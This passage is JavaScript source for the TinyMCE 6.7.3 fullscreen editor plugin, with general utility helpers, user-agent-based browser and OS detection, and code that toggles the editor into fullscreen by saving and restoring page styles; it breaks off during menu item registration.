/**
 * TinyMCE version 6.7.3 (2023-11-15)
 */

(function () {
    'use strict';

    const Cell = initial => {
      let value = initial;
      const get = () => {
        return value;
      };
      const set = v => {
        value = v;
      };
      return {
        get,
        set
      };
    };

    var global$2 = tinymce.util.Tools.resolve('tinymce.PluginManager');

    const get$5 = fullscreenState => ({ isFullscreen: () => fullscreenState.get() !== null });

    const hasProto = (v, constructor, predicate) => {
      var _a;
      if (predicate(v, constructor.prototype)) {
        return true;
      } else {
        return ((_a = v.constructor) === null || _a === void 0 ? void 0 : _a.name) === constructor.name;
      }
    };
    const typeOf = x => {
      const t = typeof x;
      if (x === null) {
        return 'null';
      } else if (t === 'object' && Array.isArray(x)) {
        return 'array';
      } else if (t === 'object' && hasProto(x, String, (o, proto) => proto.isPrototypeOf(o))) {
        return 'string';
      } else {
        return t;
      }
    };
    const isType$1 = type => value => typeOf(value) === type;
    const isSimpleType = type => value => typeof value === type;
    const eq$1 = t => a => t === a;
    const isString = isType$1('string');
    const isArray = isType$1('array');
    const isNull = eq$1(null);
    const isBoolean = isSimpleType('boolean');
    const isUndefined = eq$1(undefined);
    const isNullable = a => a === null || a === undefined;
    const isNonNullable = a => !isNullable(a);
    const isFunction = isSimpleType('function');
    const isNumber = isSimpleType('number');

    const noop = () => {
    };
    const compose = (fa, fb) => {
      return (...args) => {
        return fa(fb.apply(null, args));
      };
    };
    const compose1 = (fbc, fab) => a => fbc(fab(a));
    const constant = value => {
      return () => {
        return value;
      };
    };
    function curry(fn, ...initialArgs) {
      return (...restArgs) => {
        const all = initialArgs.concat(restArgs);
        return fn.apply(null, all);
      };
    }
    const never = constant(false);
    const always = constant(true);

    class Optional {
      constructor(tag, value) {
        this.tag = tag;
        this.value = value;
      }
      static some(value) {
        return new Optional(true, value);
      }
      static none() {
        return Optional.singletonNone;
      }
      fold(onNone, onSome) {
        if (this.tag) {
          return onSome(this.value);
        } else {
          return onNone();
        }
      }
      isSome() {
        return this.tag;
      }
      isNone() {
        return !this.tag;
      }
      map(mapper) {
        if (this.tag) {
          return Optional.some(mapper(this.value));
        } else {
          return Optional.none();
        }
      }
      bind(binder) {
        if (this.tag) {
          return binder(this.value);
        } else {
          return Optional.none();
        }
      }
      exists(predicate) {
        return this.tag && predicate(this.value);
      }
      forall(predicate) {
        return !this.tag || predicate(this.value);
      }
      filter(predicate) {
        if (!this.tag || predicate(this.value)) {
          return this;
        } else {
          return Optional.none();
        }
      }
      getOr(replacement) {
        return this.tag ? this.value : replacement;
      }
      or(replacement) {
        return this.tag ? this : replacement;
      }
      getOrThunk(thunk) {
        return this.tag ? this.value : thunk();
      }
      orThunk(thunk) {
        return this.tag ? this : thunk();
      }
      getOrDie(message) {
        if (!this.tag) {
          throw new Error(message !== null && message !== void 0 ? message : 'Called getOrDie on None');
        } else {
          return this.value;
        }
      }
      static from(value) {
        return isNonNullable(value) ? Optional.some(value) : Optional.none();
      }
      getOrNull() {
        return this.tag ? this.value : null;
      }
      getOrUndefined() {
        return this.value;
      }
      each(worker) {
        if (this.tag) {
          worker(this.value);
        }
      }
      toArray() {
        return this.tag ? [this.value] : [];
      }
      toString() {
        return this.tag ? `some(${ this.value })` : 'none()';
      }
    }
    Optional.singletonNone = new Optional(false);

    const singleton = doRevoke => {
      const subject = Cell(Optional.none());
      const revoke = () => subject.get().each(doRevoke);
      const clear = () => {
        revoke();
        subject.set(Optional.none());
      };
      const isSet = () => subject.get().isSome();
      const get = () => subject.get();
      const set = s => {
        revoke();
        subject.set(Optional.some(s));
      };
      return {
        clear,
        isSet,
        get,
        set
      };
    };
    const unbindable = () => singleton(s => s.unbind());
    const value = () => {
      const subject = singleton(noop);
      const on = f => subject.get().each(f);
      return {
        ...subject,
        on
      };
    };

    const first = (fn, rate) => {
      let timer = null;
      const cancel = () => {
        if (!isNull(timer)) {
          clearTimeout(timer);
          timer = null;
        }
      };
      const throttle = (...args) => {
        if (isNull(timer)) {
          timer = setTimeout(() => {
            timer = null;
            fn.apply(null, args);
          }, rate);
        }
      };
      return {
        cancel,
        throttle
      };
    };

    const nativePush = Array.prototype.push;
    const map = (xs, f) => {
      const len = xs.length;
      const r = new Array(len);
      for (let i = 0; i < len; i++) {
        const x = xs[i];
        r[i] = f(x, i);
      }
      return r;
    };
    const each$1 = (xs, f) => {
      for (let i = 0, len = xs.length; i < len; i++) {
        const x = xs[i];
        f(x, i);
      }
    };
    const filter$1 = (xs, pred) => {
      const r = [];
      for (let i = 0, len = xs.length; i < len; i++) {
        const x = xs[i];
        if (pred(x, i)) {
          r.push(x);
        }
      }
      return r;
    };
    const findUntil = (xs, pred, until) => {
      for (let i = 0, len = xs.length; i < len; i++) {
        const x = xs[i];
        if (pred(x, i)) {
          return Optional.some(x);
        } else if (until(x, i)) {
          break;
        }
      }
      return Optional.none();
    };
    const find$1 = (xs, pred) => {
      return findUntil(xs, pred, never);
    };
    const flatten = xs => {
      const r = [];
      for (let i = 0, len = xs.length; i < len; ++i) {
        if (!isArray(xs[i])) {
          throw new Error('Arr.flatten item ' + i + ' was not an array, input: ' + xs);
        }
        nativePush.apply(r, xs[i]);
      }
      return r;
    };
    const bind$3 = (xs, f) => flatten(map(xs, f));
    const get$4 = (xs, i) => i >= 0 && i < xs.length ? Optional.some(xs[i]) : Optional.none();
    const head = xs => get$4(xs, 0);
    const findMap = (arr, f) => {
      for (let i = 0; i < arr.length; i++) {
        const r = f(arr[i], i);
        if (r.isSome()) {
          return r;
        }
      }
      return Optional.none();
    };

    const keys = Object.keys;
    const each = (obj, f) => {
      const props = keys(obj);
      for (let k = 0, len = props.length; k < len; k++) {
        const i = props[k];
        const x = obj[i];
        f(x, i);
      }
    };

    const contains = (str, substr, start = 0, end) => {
      const idx = str.indexOf(substr, start);
      if (idx !== -1) {
        return isUndefined(end) ? true : idx + substr.length <= end;
      } else {
        return false;
      }
    };

    const isSupported$1 = dom => dom.style !== undefined && isFunction(dom.style.getPropertyValue);

    const fromHtml = (html, scope) => {
      const doc = scope || document;
      const div = doc.createElement('div');
      div.innerHTML = html;
      if (!div.hasChildNodes() || div.childNodes.length > 1) {
        const message = 'HTML does not have a single root node';
        console.error(message, html);
        throw new Error(message);
      }
      return fromDom(div.childNodes[0]);
    };
    const fromTag = (tag, scope) => {
      const doc = scope || document;
      const node = doc.createElement(tag);
      return fromDom(node);
    };
    const fromText = (text, scope) => {
      const doc = scope || document;
      const node = doc.createTextNode(text);
      return fromDom(node);
    };
    const fromDom = node => {
      if (node === null || node === undefined) {
        throw new Error('Node cannot be null or undefined');
      }
      return { dom: node };
    };
    const fromPoint = (docElm, x, y) => Optional.from(docElm.dom.elementFromPoint(x, y)).map(fromDom);
    const SugarElement = {
      fromHtml,
      fromTag,
      fromText,
      fromDom,
      fromPoint
    };

    typeof window !== 'undefined' ? window : Function('return this;')();

    const DOCUMENT = 9;
    const DOCUMENT_FRAGMENT = 11;
    const ELEMENT = 1;
    const TEXT = 3;

    const type = element => element.dom.nodeType;
    const isType = t => element => type(element) === t;
    const isElement = isType(ELEMENT);
    const isText = isType(TEXT);
    const isDocument = isType(DOCUMENT);
    const isDocumentFragment = isType(DOCUMENT_FRAGMENT);

    const is = (element, selector) => {
      const dom = element.dom;
      if (dom.nodeType !== ELEMENT) {
        return false;
      } else {
        const elem = dom;
        if (elem.matches !== undefined) {
          return elem.matches(selector);
        } else if (elem.msMatchesSelector !== undefined) {
          return elem.msMatchesSelector(selector);
        } else if (elem.webkitMatchesSelector !== undefined) {
          return elem.webkitMatchesSelector(selector);
        } else if (elem.mozMatchesSelector !== undefined) {
          return elem.mozMatchesSelector(selector);
        } else {
          throw new Error('Browser lacks native selectors');
        }
      }
    };
    const bypassSelector = dom => dom.nodeType !== ELEMENT && dom.nodeType !== DOCUMENT && dom.nodeType !== DOCUMENT_FRAGMENT || dom.childElementCount === 0;
    const all$1 = (selector, scope) => {
      const base = scope === undefined ? document : scope.dom;
      return bypassSelector(base) ? [] : map(base.querySelectorAll(selector), SugarElement.fromDom);
    };

    const eq = (e1, e2) => e1.dom === e2.dom;

    const owner = element => SugarElement.fromDom(element.dom.ownerDocument);
    const documentOrOwner = dos => isDocument(dos) ? dos : owner(dos);
    const parent = element => Optional.from(element.dom.parentNode).map(SugarElement.fromDom);
    const parents = (element, isRoot) => {
      const stop = isFunction(isRoot) ? isRoot : never;
      let dom = element.dom;
      const ret = [];
      while (dom.parentNode !== null && dom.parentNode !== undefined) {
        const rawParent = dom.parentNode;
        const p = SugarElement.fromDom(rawParent);
        ret.push(p);
        if (stop(p) === true) {
          break;
        } else {
          dom = rawParent;
        }
      }
      return ret;
    };
    const siblings$2 = element => {
      const filterSelf = elements => filter$1(elements, x => !eq(element, x));
      return parent(element).map(children).map(filterSelf).getOr([]);
    };
    const children = element => map(element.dom.childNodes, SugarElement.fromDom);

    const isShadowRoot = dos => isDocumentFragment(dos) && isNonNullable(dos.dom.host);
    const supported = isFunction(Element.prototype.attachShadow) && isFunction(Node.prototype.getRootNode);
    const isSupported = constant(supported);
    const getRootNode = supported ? e => SugarElement.fromDom(e.dom.getRootNode()) : documentOrOwner;
    const getShadowRoot = e => {
      const r = getRootNode(e);
      return isShadowRoot(r) ? Optional.some(r) : Optional.none();
    };
    const getShadowHost = e => SugarElement.fromDom(e.dom.host);
    const getOriginalEventTarget = event => {
      if (isSupported() && isNonNullable(event.target)) {
        const el = SugarElement.fromDom(event.target);
        if (isElement(el) && isOpenShadowHost(el)) {
          if (event.composed && event.composedPath) {
            const composedPath = event.composedPath();
            if (composedPath) {
              return head(composedPath);
            }
          }
        }
      }
      return Optional.from(event.target);
    };
    const isOpenShadowHost = element => isNonNullable(element.dom.shadowRoot);

    const inBody = element => {
      const dom = isText(element) ? element.dom.parentNode : element.dom;
      if (dom === undefined || dom === null || dom.ownerDocument === null) {
        return false;
      }
      const doc = dom.ownerDocument;
      return getShadowRoot(SugarElement.fromDom(dom)).fold(() => doc.body.contains(dom), compose1(inBody, getShadowHost));
    };
    const getBody = doc => {
      const b = doc.dom.body;
      if (b === null || b === undefined) {
        throw new Error('Body is not available yet');
      }
      return SugarElement.fromDom(b);
    };

    const rawSet = (dom, key, value) => {
      if (isString(value) || isBoolean(value) || isNumber(value)) {
        dom.setAttribute(key, value + '');
      } else {
        console.error('Invalid call to Attribute.set. Key ', key, ':: Value ', value, ':: Element ', dom);
        throw new Error('Attribute value was not simple');
      }
    };
    const set = (element, key, value) => {
      rawSet(element.dom, key, value);
    };
    const get$3 = (element, key) => {
      const v = element.dom.getAttribute(key);
      return v === null ? undefined : v;
    };
    const remove = (element, key) => {
      element.dom.removeAttribute(key);
    };

    const internalSet = (dom, property, value) => {
      if (!isString(value)) {
        console.error('Invalid call to CSS.set. Property ', property, ':: Value ', value, ':: Element ', dom);
        throw new Error('CSS value must be a string: ' + value);
      }
      if (isSupported$1(dom)) {
        dom.style.setProperty(property, value);
      }
    };
    const setAll = (element, css) => {
      const dom = element.dom;
      each(css, (v, k) => {
        internalSet(dom, k, v);
      });
    };
    const get$2 = (element, property) => {
      const dom = element.dom;
      const styles = window.getComputedStyle(dom);
      const r = styles.getPropertyValue(property);
      return r === '' && !inBody(element) ? getUnsafeProperty(dom, property) : r;
    };
    const getUnsafeProperty = (dom, property) => isSupported$1(dom) ? dom.style.getPropertyValue(property) : '';

    const mkEvent = (target, x, y, stop, prevent, kill, raw) => ({
      target,
      x,
      y,
      stop,
      prevent,
      kill,
      raw
    });
    const fromRawEvent = rawEvent => {
      const target = SugarElement.fromDom(getOriginalEventTarget(rawEvent).getOr(rawEvent.target));
      const stop = () => rawEvent.stopPropagation();
      const prevent = () => rawEvent.preventDefault();
      const kill = compose(prevent, stop);
      return mkEvent(target, rawEvent.clientX, rawEvent.clientY, stop, prevent, kill, rawEvent);
    };
    const handle = (filter, handler) => rawEvent => {
      if (filter(rawEvent)) {
        handler(fromRawEvent(rawEvent));
      }
    };
    const binder = (element, event, filter, handler, useCapture) => {
      const wrapped = handle(filter, handler);
      element.dom.addEventListener(event, wrapped, useCapture);
      return { unbind: curry(unbind, element, event, wrapped, useCapture) };
    };
    const bind$2 = (element, event, filter, handler) => binder(element, event, filter, handler, false);
    const unbind = (element, event, handler, useCapture) => {
      element.dom.removeEventListener(event, handler, useCapture);
    };

    const filter = always;
    const bind$1 = (element, event, handler) => bind$2(element, event, filter, handler);

    const cached = f => {
      let called = false;
      let r;
      return (...args) => {
        if (!called) {
          called = true;
          r = f.apply(null, args);
        }
        return r;
      };
    };

    const DeviceType = (os, browser, userAgent, mediaMatch) => {
      const isiPad = os.isiOS() && /ipad/i.test(userAgent) === true;
      const isiPhone = os.isiOS() && !isiPad;
      const isMobile = os.isiOS() || os.isAndroid();
      const isTouch = isMobile || mediaMatch('(pointer:coarse)');
      const isTablet = isiPad || !isiPhone && isMobile && mediaMatch('(min-device-width:768px)');
      const isPhone = isiPhone || isMobile && !isTablet;
      const iOSwebview = browser.isSafari() && os.isiOS() && /safari/i.test(userAgent) === false;
      const isDesktop = !isPhone && !isTablet && !iOSwebview;
      return {
        isiPad: constant(isiPad),
        isiPhone: constant(isiPhone),
        isTablet: constant(isTablet),
        isPhone: constant(isPhone),
        isTouch: constant(isTouch),
        isAndroid: os.isAndroid,
        isiOS: os.isiOS,
        isWebView: constant(iOSwebview),
        isDesktop: constant(isDesktop)
      };
    };

    const firstMatch = (regexes, s) => {
      for (let i = 0; i < regexes.length; i++) {
        const x = regexes[i];
        if (x.test(s)) {
          return x;
        }
      }
      return undefined;
    };
    const find = (regexes, agent) => {
      const r = firstMatch(regexes, agent);
      if (!r) {
        return {
          major: 0,
          minor: 0
        };
      }
      const group = i => {
        return Number(agent.replace(r, '$' + i));
      };
      return nu$2(group(1), group(2));
    };
    const detect$3 = (versionRegexes, agent) => {
      const cleanedAgent = String(agent).toLowerCase();
      if (versionRegexes.length === 0) {
        return unknown$2();
      }
      return find(versionRegexes, cleanedAgent);
    };
    const unknown$2 = () => {
      return nu$2(0, 0);
    };
    const nu$2 = (major, minor) => {
      return {
        major,
        minor
      };
    };
    const Version = {
      nu: nu$2,
      detect: detect$3,
      unknown: unknown$2
    };

    const detectBrowser$1 = (browsers, userAgentData) => {
      return findMap(userAgentData.brands, uaBrand => {
        const lcBrand = uaBrand.brand.toLowerCase();
        return find$1(browsers, browser => {
          var _a;
          return lcBrand === ((_a = browser.brand) === null || _a === void 0 ? void 0 : _a.toLowerCase());
        }).map(info => ({
          current: info.name,
          version: Version.nu(parseInt(uaBrand.version, 10), 0)
        }));
      });
    };

    const detect$2 = (candidates, userAgent) => {
      const agent = String(userAgent).toLowerCase();
      return find$1(candidates, candidate => {
        return candidate.search(agent);
      });
    };
    const detectBrowser = (browsers, userAgent) => {
      return detect$2(browsers, userAgent).map(browser => {
        const version = Version.detect(browser.versionRegexes, userAgent);
        return {
          current: browser.name,
          version
        };
      });
    };
    const detectOs = (oses, userAgent) => {
      return detect$2(oses, userAgent).map(os => {
        const version = Version.detect(os.versionRegexes, userAgent);
        return {
          current: os.name,
          version
        };
      });
    };

    const normalVersionRegex = /.*?version\/\ ?([0-9]+)\.([0-9]+).*/;
    const checkContains = target => {
      return uastring => {
        return contains(uastring, target);
      };
    };
    const browsers = [
      {
        name: 'Edge',
        versionRegexes: [/.*?edge\/ ?([0-9]+)\.([0-9]+)$/],
        search: uastring => {
          return contains(uastring, 'edge/') && contains(uastring, 'chrome') && contains(uastring, 'safari') && contains(uastring, 'applewebkit');
        }
      },
      {
        name: 'Chromium',
        brand: 'Chromium',
        versionRegexes: [
          /.*?chrome\/([0-9]+)\.([0-9]+).*/,
          normalVersionRegex
        ],
        search: uastring => {
          return contains(uastring, 'chrome') && !contains(uastring, 'chromeframe');
        }
      },
      {
        name: 'IE',
        versionRegexes: [
          /.*?msie\ ?([0-9]+)\.([0-9]+).*/,
          /.*?rv:([0-9]+)\.([0-9]+).*/
        ],
        search: uastring => {
          return contains(uastring, 'msie') || contains(uastring, 'trident');
        }
      },
      {
        name: 'Opera',
        versionRegexes: [
          normalVersionRegex,
          /.*?opera\/([0-9]+)\.([0-9]+).*/
        ],
        search: checkContains('opera')
      },
      {
        name: 'Firefox',
        versionRegexes: [/.*?firefox\/\ ?([0-9]+)\.([0-9]+).*/],
        search: checkContains('firefox')
      },
      {
        name: 'Safari',
        versionRegexes: [
          normalVersionRegex,
          /.*?cpu os ([0-9]+)_([0-9]+).*/
        ],
        search: uastring => {
          return (contains(uastring, 'safari') || contains(uastring, 'mobile/')) && contains(uastring, 'applewebkit');
        }
      }
    ];
    const oses = [
      {
        name: 'Windows',
        search: checkContains('win'),
        versionRegexes: [/.*?windows\ nt\ ?([0-9]+)\.([0-9]+).*/]
      },
      {
        name: 'iOS',
        search: uastring => {
          return contains(uastring, 'iphone') || contains(uastring, 'ipad');
        },
        versionRegexes: [
          /.*?version\/\ ?([0-9]+)\.([0-9]+).*/,
          /.*cpu os ([0-9]+)_([0-9]+).*/,
          /.*cpu iphone os ([0-9]+)_([0-9]+).*/
        ]
      },
      {
        name: 'Android',
        search: checkContains('android'),
        versionRegexes: [/.*?android\ ?([0-9]+)\.([0-9]+).*/]
      },
      {
        name: 'macOS',
        search: checkContains('mac os x'),
        versionRegexes: [/.*?mac\ os\ x\ ?([0-9]+)_([0-9]+).*/]
      },
      {
        name: 'Linux',
        search: checkContains('linux'),
        versionRegexes: []
      },
      {
        name: 'Solaris',
        search: checkContains('sunos'),
        versionRegexes: []
      },
      {
        name: 'FreeBSD',
        search: checkContains('freebsd'),
        versionRegexes: []
      },
      {
        name: 'ChromeOS',
        search: checkContains('cros'),
        versionRegexes: [/.*?chrome\/([0-9]+)\.([0-9]+).*/]
      }
    ];
    const PlatformInfo = {
      browsers: constant(browsers),
      oses: constant(oses)
    };

    const edge = 'Edge';
    const chromium = 'Chromium';
    const ie = 'IE';
    const opera = 'Opera';
    const firefox = 'Firefox';
    const safari = 'Safari';
    const unknown$1 = () => {
      return nu$1({
        current: undefined,
        version: Version.unknown()
      });
    };
    const nu$1 = info => {
      const current = info.current;
      const version = info.version;
      const isBrowser = name => () => current === name;
      return {
        current,
        version,
        isEdge: isBrowser(edge),
        isChromium: isBrowser(chromium),
        isIE: isBrowser(ie),
        isOpera: isBrowser(opera),
        isFirefox: isBrowser(firefox),
        isSafari: isBrowser(safari)
      };
    };
    const Browser = {
      unknown: unknown$1,
      nu: nu$1,
      edge: constant(edge),
      chromium: constant(chromium),
      ie: constant(ie),
      opera: constant(opera),
      firefox: constant(firefox),
      safari: constant(safari)
    };

    const windows = 'Windows';
    const ios = 'iOS';
    const android = 'Android';
    const linux = 'Linux';
    const macos = 'macOS';
    const solaris = 'Solaris';
    const freebsd = 'FreeBSD';
    const chromeos = 'ChromeOS';
    const unknown = () => {
      return nu({
        current: undefined,
        version: Version.unknown()
      });
    };
    const nu = info => {
      const current = info.current;
      const version = info.version;
      const isOS = name => () => current === name;
      return {
        current,
        version,
        isWindows: isOS(windows),
        isiOS: isOS(ios),
        isAndroid: isOS(android),
        isMacOS: isOS(macos),
        isLinux: isOS(linux),
        isSolaris: isOS(solaris),
        isFreeBSD: isOS(freebsd),
        isChromeOS: isOS(chromeos)
      };
    };
    const OperatingSystem = {
      unknown,
      nu,
      windows: constant(windows),
      ios: constant(ios),
      android: constant(android),
      linux: constant(linux),
      macos: constant(macos),
      solaris: constant(solaris),
      freebsd: constant(freebsd),
      chromeos: constant(chromeos)
    };

    const detect$1 = (userAgent, userAgentDataOpt, mediaMatch) => {
      const browsers = PlatformInfo.browsers();
      const oses = PlatformInfo.oses();
      const browser = userAgentDataOpt.bind(userAgentData => detectBrowser$1(browsers, userAgentData)).orThunk(() => detectBrowser(browsers, userAgent)).fold(Browser.unknown, Browser.nu);
      const os = detectOs(oses, userAgent).fold(OperatingSystem.unknown, OperatingSystem.nu);
      const deviceType = DeviceType(os, browser, userAgent, mediaMatch);
      return {
        browser,
        os,
        deviceType
      };
    };
    const PlatformDetection = { detect: detect$1 };

    const mediaMatch = query => window.matchMedia(query).matches;
    let platform = cached(() => PlatformDetection.detect(navigator.userAgent, Optional.from(navigator.userAgentData), mediaMatch));
    const detect = () => platform();

    const r = (left, top) => {
      const translate = (x, y) => r(left + x, top + y);
      return {
        left,
        top,
        translate
      };
    };
    const SugarPosition = r;

    const get$1 = _DOC => {
      const doc = _DOC !== undefined ? _DOC.dom : document;
      const x = doc.body.scrollLeft || doc.documentElement.scrollLeft;
      const y = doc.body.scrollTop || doc.documentElement.scrollTop;
      return SugarPosition(x, y);
    };

    const get = _win => {
      const win = _win === undefined ? window : _win;
      if (detect().browser.isFirefox()) {
        return Optional.none();
      } else {
        return Optional.from(win.visualViewport);
      }
    };
    const bounds = (x, y, width, height) => ({
      x,
      y,
      width,
      height,
      right: x + width,
      bottom: y + height
    });
    const getBounds = _win => {
      const win = _win === undefined ? window : _win;
      const doc = win.document;
      const scroll = get$1(SugarElement.fromDom(doc));
      return get(win).fold(() => {
        const html = win.document.documentElement;
        const width = html.clientWidth;
        const height = html.clientHeight;
        return bounds(scroll.left, scroll.top, width, height);
      }, visualViewport => bounds(Math.max(visualViewport.pageLeft, scroll.left), Math.max(visualViewport.pageTop, scroll.top), visualViewport.width, visualViewport.height));
    };
    const bind = (name, callback, _win) => get(_win).map(visualViewport => {
      const handler = e => callback(fromRawEvent(e));
      visualViewport.addEventListener(name, handler);
      return { unbind: () => visualViewport.removeEventListener(name, handler) };
    }).getOrThunk(() => ({ unbind: noop }));

    var global$1 = tinymce.util.Tools.resolve('tinymce.dom.DOMUtils');

    var global = tinymce.util.Tools.resolve('tinymce.Env');

    const fireFullscreenStateChanged = (editor, state) => {
      editor.dispatch('FullscreenStateChanged', { state });
      editor.dispatch('ResizeEditor');
    };

    const option = name => editor => editor.options.get(name);
    const register$2 = editor => {
      const registerOption = editor.options.register;
      registerOption('fullscreen_native', {
        processor: 'boolean',
        default: false
      });
    };
    const getFullscreenNative = option('fullscreen_native');

    const getFullscreenRoot = editor => {
      const elem = SugarElement.fromDom(editor.getElement());
      return getShadowRoot(elem).map(getShadowHost).getOrThunk(() => getBody(owner(elem)));
    };
    const getFullscreenElement = root => {
      if (root.fullscreenElement !== undefined) {
        return root.fullscreenElement;
      } else if (root.msFullscreenElement !== undefined) {
        return root.msFullscreenElement;
      } else if (root.webkitFullscreenElement !== undefined) {
        return root.webkitFullscreenElement;
      } else {
        return null;
      }
    };
    const getFullscreenchangeEventName = () => {
      if (document.fullscreenElement !== undefined) {
        return 'fullscreenchange';
      } else if (document.msFullscreenElement !== undefined) {
        return 'MSFullscreenChange';
      } else if (document.webkitFullscreenElement !== undefined) {
        return 'webkitfullscreenchange';
      } else {
        return 'fullscreenchange';
      }
    };
    const requestFullscreen = sugarElem => {
      const elem = sugarElem.dom;
      if (elem.requestFullscreen) {
        elem.requestFullscreen();
      } else if (elem.msRequestFullscreen) {
        elem.msRequestFullscreen();
      } else if (elem.webkitRequestFullScreen) {
        elem.webkitRequestFullScreen();
      }
    };
    const exitFullscreen = sugarDoc => {
      const doc = sugarDoc.dom;
      if (doc.exitFullscreen) {
        doc.exitFullscreen();
      } else if (doc.msExitFullscreen) {
        doc.msExitFullscreen();
      } else if (doc.webkitCancelFullScreen) {
        doc.webkitCancelFullScreen();
      }
    };
    const isFullscreenElement = elem => elem.dom === getFullscreenElement(owner(elem).dom);

    const ancestors$1 = (scope, predicate, isRoot) => filter$1(parents(scope, isRoot), predicate);
    const siblings$1 = (scope, predicate) => filter$1(siblings$2(scope), predicate);

    const all = selector => all$1(selector);
    const ancestors = (scope, selector, isRoot) => ancestors$1(scope, e => is(e, selector), isRoot);
    const siblings = (scope, selector) => siblings$1(scope, e => is(e, selector));

    const attr = 'data-ephox-mobile-fullscreen-style';
    const siblingStyles = 'display:none!important;';
    const ancestorPosition = 'position:absolute!important;';
    const ancestorStyles = 'top:0!important;left:0!important;margin:0!important;padding:0!important;width:100%!important;height:100%!important;overflow:visible!important;';
    const bgFallback = 'background-color:rgb(255,255,255)!important;';
    const isAndroid = global.os.isAndroid();
    const matchColor = editorBody => {
      const color = get$2(editorBody, 'background-color');
      return color !== undefined && color !== '' ? 'background-color:' + color + '!important' : bgFallback;
    };
    const clobberStyles = (dom, container, editorBody) => {
      const gatherSiblings = element => {
        return siblings(element, '*:not(.tox-silver-sink)');
      };
      const clobber = clobberStyle => element => {
        const styles = get$3(element, 'style');
        const backup = styles === undefined ? 'no-styles' : styles.trim();
        if (backup === clobberStyle) {
          return;
        } else {
          set(element, attr, backup);
          setAll(element, dom.parseStyle(clobberStyle));
        }
      };
      const ancestors$1 = ancestors(container, '*');
      const siblings$1 = bind$3(ancestors$1, gatherSiblings);
      const bgColor = matchColor(editorBody);
      each$1(siblings$1, clobber(siblingStyles));
      each$1(ancestors$1, clobber(ancestorPosition + ancestorStyles + bgColor));
      const containerStyles = isAndroid === true ? '' : ancestorPosition;
      clobber(containerStyles + ancestorStyles + bgColor)(container);
    };
    const restoreStyles = dom => {
      const clobberedEls = all('[' + attr + ']');
      each$1(clobberedEls, element => {
        const restore = get$3(element, attr);
        if (restore && restore !== 'no-styles') {
          setAll(element, dom.parseStyle(restore));
        } else {
          remove(element, 'style');
        }
        remove(element, attr);
      });
    };

    const DOM = global$1.DOM;
    const getScrollPos = () => getBounds(window);
    const setScrollPos = pos => window.scrollTo(pos.x, pos.y);
    const viewportUpdate = get().fold(() => ({
      bind: noop,
      unbind: noop
    }), visualViewport => {
      const editorContainer = value();
      const resizeBinder = unbindable();
      const scrollBinder = unbindable();
      const refreshScroll = () => {
        document.body.scrollTop = 0;
        document.documentElement.scrollTop = 0;
      };
      const refreshVisualViewport = () => {
        window.requestAnimationFrame(() => {
          editorContainer.on(container => setAll(container, {
            top: visualViewport.offsetTop + 'px',
            left: visualViewport.offsetLeft + 'px',
            height: visualViewport.height + 'px',
            width: visualViewport.width + 'px'
          }));
        });
      };
      const update = first(() => {
        refreshScroll();
        refreshVisualViewport();
      }, 50);
      const bind$1 = element => {
        editorContainer.set(element);
        update.throttle();
        resizeBinder.set(bind('resize', update.throttle));
        scrollBinder.set(bind('scroll', update.throttle));
      };
      const unbind = () => {
        editorContainer.on(() => {
          resizeBinder.clear();
          scrollBinder.clear();
        });
        editorContainer.clear();
      };
      return {
        bind: bind$1,
        unbind
      };
    });
    const toggleFullscreen = (editor, fullscreenState) => {
      const body = document.body;
      const documentElement = document.documentElement;
      const editorContainer = editor.getContainer();
      const editorContainerS = SugarElement.fromDom(editorContainer);
      const fullscreenRoot = getFullscreenRoot(editor);
      const fullscreenInfo = fullscreenState.get();
      const editorBody = SugarElement.fromDom(editor.getBody());
      const isTouch = global.deviceType.isTouch();
      const editorContainerStyle = editorContainer.style;
      const iframe = editor.iframeElement;
      const iframeStyle = iframe === null || iframe === void 0 ? void 0 : iframe.style;
      const handleClasses = handler => {
        handler(body, 'tox-fullscreen');
        handler(documentElement, 'tox-fullscreen');
        handler(editorContainer, 'tox-fullscreen');
        getShadowRoot(editorContainerS).map(root => getShadowHost(root).dom).each(host => {
          handler(host, 'tox-fullscreen');
          handler(host, 'tox-shadowhost');
        });
      };
      const cleanup = () => {
        if (isTouch) {
          restoreStyles(editor.dom);
        }
        handleClasses(DOM.removeClass);
        viewportUpdate.unbind();
        Optional.from(fullscreenState.get()).each(info => info.fullscreenChangeHandler.unbind());
      };
      if (!fullscreenInfo) {
        const fullscreenChangeHandler = bind$1(owner(fullscreenRoot), getFullscreenchangeEventName(), _evt => {
          if (getFullscreenNative(editor)) {
            if (!isFullscreenElement(fullscreenRoot) && fullscreenState.get() !== null) {
              toggleFullscreen(editor, fullscreenState);
            }
          }
        });
        const newFullScreenInfo = {
          scrollPos: getScrollPos(),
          containerWidth: editorContainerStyle.width,
          containerHeight: editorContainerStyle.height,
          containerTop: editorContainerStyle.top,
          containerLeft: editorContainerStyle.left,
          iframeWidth: iframeStyle.width,
          iframeHeight: iframeStyle.height,
          fullscreenChangeHandler
        };
        if (isTouch) {
          clobberStyles(editor.dom, editorContainerS, editorBody);
        }
        iframeStyle.width = iframeStyle.height = '100%';
        editorContainerStyle.width = editorContainerStyle.height = '';
        handleClasses(DOM.addClass);
        viewportUpdate.bind(editorContainerS);
        editor.on('remove', cleanup);
        fullscreenState.set(newFullScreenInfo);
        if (getFullscreenNative(editor)) {
          requestFullscreen(fullscreenRoot);
        }
        fireFullscreenStateChanged(editor, true);
      } else {
        fullscreenInfo.fullscreenChangeHandler.unbind();
        if (getFullscreenNative(editor) && isFullscreenElement(fullscreenRoot)) {
          exitFullscreen(owner(fullscreenRoot));
        }
        iframeStyle.width = fullscreenInfo.iframeWidth;
        iframeStyle.height = fullscreenInfo.iframeHeight;
        editorContainerStyle.width = fullscreenInfo.containerWidth;
        editorContainerStyle.height = fullscreenInfo.containerHeight;
        editorContainerStyle.top = fullscreenInfo.containerTop;
        editorContainerStyle.left = fullscreenInfo.containerLeft;
        cleanup();
        setScrollPos(fullscreenInfo.scrollPos);
        fullscreenState.set(null);
        fireFullscreenStateChanged(editor, false);
        editor.off('remove', cleanup);
      }
    };

    const register$1 = (editor, fullscreenState) => {
      editor.addCommand('mceFullScreen', () => {
        toggleFullscreen(editor, fullscreenState);
      });
    };

    const makeSetupHandler = (editor, fullscreenState) => api => {
      api.setActive(fullscreenState.get() !== null);
      const editorEventCallback = e => api.setActive(e.state);
      editor.on('FullscreenStateChanged', editorEventCallback);
      return () => editor.off('FullscreenStateChanged', editorEventCallback);
    };
    const register = (editor, fullscreenState) => {
      const onAction = () => editor.execCommand('mceFullScreen');
      editor.ui.registry.addToggleMenuItem('fullscreen', {
        text: 'Fullscreen',
        icon: 'fullscreen',
